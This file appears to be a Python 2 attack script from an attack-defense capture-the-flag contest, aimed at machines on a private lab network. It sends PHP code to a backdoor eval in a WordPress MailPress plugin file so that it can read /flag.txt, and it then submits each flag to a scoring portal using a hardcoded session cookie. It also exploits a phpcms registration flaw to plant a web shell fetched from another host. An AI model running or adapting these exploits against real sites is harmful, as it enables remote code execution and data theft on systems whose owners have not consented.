#!/usr/bin/env python
# coding:utf-8
import requests
import re
import time

req = None

TOKEN = ""
SUBMIT_URL = "http://192.168.80.1/lms/portal/sp/hz_flag.php"
SUBMIT_U = ""
SUBMIT_P = ""

URLS = ['172.20.101.101',
        '172.20.102.101',
        '172.20.103.101',
        # '172.20.104.101',
        '172.20.105.101',
        '172.20.106.101',
        '172.20.107.101',
        '172.20.108.101'
        ]
URLS2 = ['172.20.101.103',
         '172.20.102.103',
         '172.20.103.103',
         # '172.20.104.103',
         '172.20.105.103',
         '172.20.106.103',
         '172.20.107.103',
         '172.20.108.103'
         ]


def poc_eval_backdoor_getflag_1(shellurl, p, code):
    data = {
        p: code
    }
    try:
        res = requests.post(shellurl, data=data, timeout=5)
        if res.status_code == 200:
            return res.content
    except Exception, e:
        print e


def poc_phpcms_reg_shell(url):
    u = 'http://{}/phpcms/index.php?m=member&c=index&a=register&siteid=1'.format(
        url)
    data = {
        'siteid': '1',
        'modelid': '1',
        'username': 'test',
        'password': 'testxx',
        'email': 'test@test.com',
        'info[content]': '<img src=http://172.20.109.101/shell.txt?.php#.jpg>',
        'dosubmit': '1',
    }
    rep = requests.post(u, data=data)
    print(rep.content)
    shell = ''
    re_result = re.findall(r'&lt;img src=(.*)&gt', rep.content)
    if len(re_result):
        shell = re_result[0]
        print url, shell
        return shell


def submit(flag, ip):
    headers = {
        "Cookie": "SSCSum=14; zlms-sid=uh8kbtd9jrki9ch4jo7qfnpnt0; webcs_test_cookie=lms_cookie_checker; lms_login_name=HZ9; PHPSESSID=jq11tlbp5kuvtk49h94r6b1ap2"
    }
    data = {
        "melee_flag": flag,
        "melee_ip": ip
    }
    res = requests.post(SUBMIT_URL, data=data, headers=headers, timeout=5)
    if res.status_code == 200:
        # print res.content
        html = res.content
        print html[-200:]
        if '您已提交过当前IP和FLAG' in html:
            print '您已提交过当前IP和FLAG'
        elif '恭喜您答对了' in html:
            print '恭喜您答对了'


def fuck_1():
    req = requests.session()
    for ip in URLS:
        try:
            su = 'http://{}/wp-content/plugins/mailpress/uninstall.php'.format(
                ip)
            flag = poc_eval_backdoor_getflag_1(
                su, "525", "echo file_get_contents('/flag.txt');")
            if flag:
                flag = flag.strip().replace('\r', '').replace('\n', '')
                print ip, flag
                submit(flag, ip)
            time.sleep(15)
        except Exception, e:
            print e


def test():
    for ip in URLS:
        # su = 'http://{}/wp-content/plugins/mailpress/uninstall.php'.format(
        #     ip)
        custom_shell_add_shell(ip)
        # flag = poc_eval_backdoor_getflag_1(
        #     su, "525", "echo file_get_contents('/flag.txt');")
        print ip


if __name__ == '__main__':
    fuck_1()
    # while True:
    #     fuck_1()
    #     print 'Waiting...'
    #     time.sleep(60 * 20)
    # poc_phpcms_reg_shell('172.20.102.103')
    # for ip in URLS2:
    #     poc_phpcms_reg_shell(ip)
